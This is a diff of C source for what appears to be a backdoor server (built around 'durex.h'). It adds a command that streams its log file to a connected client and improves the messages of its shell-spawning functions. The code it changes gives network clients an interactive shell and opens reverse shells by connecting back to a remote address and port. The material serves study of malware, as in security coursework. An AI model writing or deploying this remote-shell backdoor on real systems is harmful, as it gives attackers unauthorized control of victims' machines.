@@ -21,6 +21,10 @@
 /* getrlimit */
 #include <sys/time.h>
 #include <sys/resource.h>
+/* open */
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 
 #include "durex.h"
 
@@ -29,7 +33,11 @@ void				serverHelp(t_cl *client, t_cmd *cmds)
 	serverLog("[CMDS] - %d: Help wanted.", client->fd);
 	for (size_t i = 0; cmds[i].name; i++) {
 		clientWrite(cmds[i].name, client);
-		clientWrite(": ", client);
+		if (cmds[i].options != NULL) {
+			clientWrite(" ", client);
+			clientWrite(cmds[i].options, client);
+		}
+		clientWrite(" : ", client);
 		clientWrite(cmds[i].def, client);
 		clientWrite("\n", client);
 	}
@@ -38,10 +46,11 @@ void				serverHelp(t_cl *client, t_cmd *cmds)
 
 void				serverShell(t_cl *client, t_cmd *cmds)
 {
-	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
-	clientWrite("Spawning shell...\n", client);
-	client->shell = spawnShell(client->fd);
 	(void)cmds;
+	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
+	client->shell = spawnShell(client->fd);
+	if (client->shell == -1)
+		clientWrite("Failed to spawn a shell...", client);
 }
 
 static int			serverConnectShell(t_cl *client, char *port)
@@ -60,7 +69,9 @@ static int			serverConnectShell(t_cl *client, char *port)
 	hints.ai_addr = NULL;
 	hints.ai_next = NULL;
 	if ((fd = getaddrinfo(client->addr, port, &hints, &res))) {
-		serverLog("[ERRO] - %s", gai_strerror(fd));
+		serverLog("[ERRO] - %d: %s", client->fd, gai_strerror(fd));
+		clientWrite(gai_strerror(fd), client);
+		clientWrite("\n", client);
 		return -1;
 	}
 	tmp = res;
@@ -80,10 +91,17 @@ static int			serverConnectShell(t_cl *client, char *port)
 		serverLog("[ERRO] - %d: Failed to connect to %s:%s (%s)",
 				  client->fd, client->addr, port,
 				  (tmp) ? strerror(errno) : "No server found");
-		clientWrite("Failed...\n", client);
+		clientWrite("Failed to connect to ", client);
+		clientWrite(client->addr, client);
+		clientWrite(":", client);
+		clientWrite(port, client);
+		clientWrite(" (", client);
+		clientWrite((tmp) ? strerror(errno) : "No server found", client);
+		clientWrite(")\n", client);
 		return -1;
 	}
-	serverLog("[CMDS] - Connection to %s:%s succeeded.", client->addr, port);
+	serverLog("[CMDS] - %d: Connection to %s:%s succeeded.", client->fd, client->addr, port);
+	clientWrite("Succesfully Connected\n", client);
 	return fd;
 }
 
@@ -94,15 +112,16 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 	int				fd;
 	pid_t			pid;
 
-	clientWrite("Spawning reverse shell...\n", client);
-	options = mysplitwhitespaces(cmds->options);
+	serverLog("[CMDS] - %d: Reverse shell wanted.", client->fd);
+	options = mysplitwhitespaces(cmds->opt);
 	port = (options && options[1]) ? options[1] : SERVER_REMOTE_PORT;
-	serverLog("[CMDS] - %d: Spawning reverse shell on %s:%s", client->fd, client->addr, port);
 	fd = serverConnectShell(client, port);
 	mytabdel(&options);
 	if (fd >= 0) {
 		pid = fork();
 		if (pid == 0) {
+			serverLog("[CMDS] - %d: Spawning reverse shell on %s:%s", client->fd, client->addr, port);
+			clientWrite("Spawning reverse shell...\n", client);
 			struct rlimit	rlim;
 
 			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
@@ -123,12 +142,37 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 		} else if (pid > 0) {
 			serverQuitClient(client, cmds);
 		} else {
-			serverLog("[ERRO] - %d: Failed to fork a new shell", client->fd);
+			serverLog("[ERRO] - %d: Failed to fork a new reverse shell.", client->fd);
+			clientWrite("Fork failed.", client);
 		}
 		close(fd);
 	} else {
 		clientWrite("$> ", client);
 	}
+}
+
+void			serverPrintLogs(t_cl *client, t_cmd *cmds)
+{
+	int			fd;
+	char		buf[128];
+	int			ret;
+
+	(void)cmds;	
+	serverLog("[CMDS] - %d: Logs wanted.", client->fd);
+	fd = open(SERVER_REPORTER, O_RDONLY);
+	if (fd < 0)
+		clientWrite("Failed to open logs...", client);
+	else {
+		while (1) {
+			ret = read(fd, buf, sizeof(buf) - 1);
+			if (ret <= 0)
+				break ;
+			buf[ret] = '\0';
+			clientWrite(buf, client);
+		}
+		close(fd);
+	}
+	clientWrite("$> ", client);
 }
 
 void			serverQuitClient(t_cl *client, t_cmd *cmds)
